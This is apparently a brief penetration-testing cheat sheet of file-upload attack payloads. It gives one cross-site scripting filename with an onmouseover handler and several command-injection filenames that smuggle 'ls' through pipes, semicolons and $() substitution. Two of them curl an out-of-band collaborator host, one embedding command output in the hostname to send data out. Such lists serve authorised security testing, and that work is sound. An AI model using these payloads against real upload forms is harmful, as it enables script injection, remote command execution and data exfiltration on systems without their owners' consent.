
## FILE UPLOAD + XSS

```
filename="<u onmouseover=alert(1)>eee.png
```

## FILEUPLOAD + RCE

```
filename="test.png | ls"

filename="test.png ; ls"

filename="test $(curl colaborator.net).png"

filename="test $(curl $(ls)colaborator.net).png"
```